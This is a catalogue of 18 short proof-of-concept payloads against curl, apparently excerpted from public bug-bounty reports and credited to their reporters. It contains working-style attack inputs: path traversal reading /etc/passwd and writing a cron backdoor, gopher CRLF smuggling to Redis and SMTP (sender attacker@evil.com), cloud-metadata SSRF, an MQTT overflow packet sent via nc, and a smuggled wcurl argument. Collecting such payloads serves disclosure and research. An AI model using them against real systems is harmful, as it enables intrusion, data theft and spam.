# curl

18 payloads.

### `b29bc166`

```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl -v "http://localhost/safepath/something#/../../anotherpath/somethingelse"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

*   Trying ::1:80...
* TCP_NODELAY set
* Connected to localhost (::1) port 80 (#0)
> GET /s
```

— [SMB access smuggling via FILE URL on Windows](https://hackerone.com/reports/726117) · curl · [fms](https://hackerone.com/fms)

### `2c1f1dd3`

```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://localhost/windows/win.ini"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    92  100    92    0     0  46000      0 --:--:-- --:--:-- --:--:-- 46000
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1


fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.
```

— [SMB access smuggling via FILE URL on Windows](https://hackerone.com/reports/726117) · curl · [fms](https://hackerone.com/fms)

### `3208f5b2`

```
./ssrf_pasvaggresvftp.sh -t 127.0.0.1/31 -p 80,8000-8100 -x ./ftp_curl.sh -vv
```

— [CVE-2020-8284: trusting FTP PASV responses](https://hackerone.com/reports/1040166) · curl · [vepe](https://hackerone.com/vepe)

### `06a4d041`

```
curl -vv 'f[h-j]le:///etc/passwd' will  parse 3 request , like  curl -vv 'fhle:///etc/passwd' 、curl -vv 'file:///etc/passwd' 、curl -vv 'fjle:///etc/passwd'
```

— [error parse uri path in curl](https://hackerone.com/reports/1566462) · curl · [iylz](https://hackerone.com/iylz)

### `9fb02cc3`

```
sftp://host/~a../other/file
```

— [CVE-2023-27534: SFTP path ~ resolving discrepancy](https://hackerone.com/reports/1892351) · curl · [nyymi](https://hackerone.com/nyymi)

### `55013d9f`

```
options.pidfile = "/etc/passwd"   # Replace this with a critical or sensitive file
```

**Parameter:** `pidfile`
— [Arbitrary File Deletion Vulnerability in curl Source Code via os.unlink()](https://hackerone.com/reports/2864414) · curl · [aadityaathehacker](https://hackerone.com/aadityaathehacker)

### `bb53f2b4`

```
export IPFS_PATH="/tmp/../../../../etc"  # Traverse to /etc  
   (No hacking required! Just setting an environment variable.)
```

— [Path Traversal Vulnerability in curl via Unsanitized IPFS_PATH Environment Variable](https://hackerone.com/reports/3100073) · curl · [ziad616](https://hackerone.com/ziad616)

### `8e86c506`

```
# Craft CONNECT packet with password length = 65535 (0xFFFF)
printf '\x10\x1a\x00\x04MQTT\x04\xc2\x00\x3c\x00\x04test\x00\x04user\xff\xff' | nc localhost 1883
```

— [Buffer Overflow in curl MQTT Test Server (tests/server/mqttd.c) via Malicious CONNECT Packet](https://hackerone.com/reports/3101127) · curl · [drdee-hackerone](https://hackerone.com/drdee-hackerone)

### `bcc3c877`

```
sudo curl                                   -o "../../etc/cron.daily/zzz-backdoor"
```

— [\[High\] Arbitrary File Write via Path Traversal in cURL CLI (`-o`, `--output`) (CWE-22: Improper Limitation of a Pathname to a Restricted Directory)](https://hackerone.com/reports/3120987) · curl · [oicus](https://hackerone.com/oicus)

### `bc2fda36`

```
- curl                 -o "../../.gitlab-ci.yml"
```

— [\[High\] Arbitrary File Write via Path Traversal in cURL CLI (`-o`, `--output`) (CWE-22: Improper Limitation of a Pathname to a Restricted Directory)](https://hackerone.com/reports/3120987) · curl · [oicus](https://hackerone.com/oicus)

### `5acd21d1`

```
gopher://example.com/1/selector%0d%0aINJECTED_COMMAND
```

— [Gopher Protocol Command Injection (SSRF Smuggling)](https://hackerone.com/reports/3508785) · curl · [andrew-bbp](https://hackerone.com/andrew-bbp)

### `9a5c1a0b`

```
curl -v "gopher://localhost:7070/1/first-command%0d%0asecond-command"
```

— [Gopher Protocol Command Injection (SSRF Smuggling)](https://hackerone.com/reports/3508785) · curl · [andrew-bbp](https://hackerone.com/andrew-bbp)

### `14605e05`

```
curl "gopher://localhost:7070/1/legitimate%0d%0ainjected%0d%0amalicious"
```

— [Gopher Protocol Command Injection (SSRF Smuggling)](https://hackerone.com/reports/3508785) · curl · [andrew-bbp](https://hackerone.com/andrew-bbp)

### `ad2e0f25`

```
gopher://internal-redis:6379/1/SET%20key%20value%0d%0aGET%20sensitive_data
```

— [Gopher Protocol Command Injection (SSRF Smuggling)](https://hackerone.com/reports/3508785) · curl · [andrew-bbp](https://hackerone.com/andrew-bbp)

### `4d7198d7`

```
gopher://mail-server:25/1/MAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<victim@target.com>%0d%0aDATA%0d%0aSubject:%20Phishing
```

— [Gopher Protocol Command Injection (SSRF Smuggling)](https://hackerone.com/reports/3508785) · curl · [andrew-bbp](https://hackerone.com/andrew-bbp)

### `3f847e65`

```
./build-poc/src/curl -u 'testuser:Password1' smb://127.0.0.1:4455/share/file.txt
```

**Parameter:** `url`
— [LM Challenge-Response Hash Always Sent in SMB Authentication](https://hackerone.com/reports/3584491) · curl · [brewm4ster](https://hackerone.com/brewm4ster)

### `fe0bb765`

```
tab_payload=$(printf 'file://%s\t--url=file://%s' "$BENIGN" "$SECRET")
wcurl -- "$tab_payload"
```

— [wcurl treats some URL operands after -- as curl options](https://hackerone.com/reports/3708482) · curl · [p4p3r_hak](https://hackerone.com/p4p3r_hak)

### `d05ba2d2`

```
http:///169.254.169.254/latest/meta-data/
```

— [URL API: triple-slash parses path segment as hostname](https://hackerone.com/reports/3923212) · curl · [thinhlx](https://hackerone.com/thinhlx)
